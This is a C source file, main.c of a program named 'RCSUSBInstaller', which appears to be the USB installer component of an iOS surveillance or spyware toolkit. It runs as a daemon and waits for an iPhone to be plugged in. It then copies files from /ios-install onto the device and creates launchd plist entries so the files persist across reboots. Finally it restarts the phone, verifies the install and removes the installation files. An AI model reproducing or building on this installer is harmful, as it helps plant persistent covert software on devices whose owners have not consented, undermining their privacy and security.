//
//  main.c
//  RCSUSBInstaller
//
//  Created by armored on 2/6/13.
//  Copyright (c) 2013 armored. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include "../iOSUsbSupport.h"
#include <syslog.h>

int main(int argc, const char * argv[])
{
  int devAttach = 0;

  if (argv[1] != NULL && strcmp(argv[1], "--nodaemon") == 0)
  {
    syslog(LOG_INFO, "iosusb - Running %s in foreground...\n", argv[0]);
  }
  else
  {
    pid_t pid,sid;

    syslog(LOG_INFO, "iosusb - Running daemon...\n");

    /* Fork off the parent process */       
    pid = fork();
    if (pid < 0) {
       exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then
       we can exit the parent process. */
    if (pid > 0) {
            exit(EXIT_SUCCESS);
    }
    /* Change the file mode mask */
    //umask(0);

    //syslog(LOG_INFO, "iosusb - umask setted\n");

    /* Create a new SID for the child process 
    sid = setsid();

    syslog(LOG_INFO, "iosusb - sid setted\n");
    
    if (sid < 0) {
            exit(EXIT_FAILURE);
    }
    */

    //syslog(LOG_INFO, "iosusb - chdir done\n");

    /* Change the current working directory */
    //if ((chdir("/")) < 0) {
    // exit(EXIT_FAILURE);
    //}
   
    /* Close out the standard file descriptors */
    //close(STDIN_FILENO);
    //close(STDOUT_FILENO);
    //close(STDERR_FILENO);
  }

  syslog(LOG_INFO, "iosusb - Waiting for device...\n");

while(1)
{
retry_installation:

  while(devAttach == 0)
  {
    devAttach = isDeviceAttached();
    sleep(1);
  }

  syslog(LOG_INFO, "iosusb - Device attached!\n");

  sleep(1);

  if (check_installation(1, 2) == 1)
  {
    syslog(LOG_INFO, "iosusb - Device already installed!\n");
    
    sleep (5);

    goto retry_installation;
  } 

  syslog(LOG_INFO, "iosusb - start installation...\n");

  char **dir_content = list_dir_content("/ios-install");

  if (dir_content[0] == NULL)
  {
    syslog(LOG_INFO, "iosusb - cannot found installation dir!\n");
    return 0;
  }

  syslog(LOG_INFO, "iosusb - create installation dir...\n");

  if (make_install_directory() != 0)
  {
    syslog(LOG_INFO, "iosusb - cannot create installer folder\n");
	  return 0;
  }

  syslog(LOG_INFO, "iosusb - copying files...\n");

  if (copy_install_files("/ios-install", dir_content) != 0)
  {
    syslog(LOG_INFO, "iosusb - cannot copy files in installer folder\n");
	  return 0;
  }

  syslog(LOG_INFO, "iosusb - copying files... done!\n");

  if (create_launchd_plist() != 0)
  {
   syslog(LOG_INFO, "iosusb - cannot create plist files\n");
   return 0;
  }

  syslog(LOG_INFO, "iosusb - try to restart device...\n");

  if (restart_device() == 1)
  {
    syslog(LOG_INFO, "iosusb - try to restart device...restarting\n");
  }
  else 
  {
	 syslog(LOG_INFO, "iosusb - can't restart device: try it manually!\n");
  }

  sleep(1);

  int isDeviceOn = 0;

  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    sleep(1);
  } while(isDeviceOn == 1);

  // Wait for device on
  do
  {
    isDeviceOn = isDeviceAttached();
    sleep(1);
  } while(isDeviceOn == 0);

  syslog(LOG_INFO, "iosusb - device connected\n");

  syslog(LOG_INFO, "iosusb - checking installation...\n");

  if (check_installation(10, 10) == 1)
  {
	 syslog(LOG_INFO, "iosusb - installation done!\n");

	 if (remove_installation() == 0)
		syslog(LOG_INFO, "iosusb - cannot remove installation file!\n");
  }
  else
  {
	 syslog(LOG_INFO, "iosusb - installation failed: please retry!\n");
  }
}
  return 0;
}



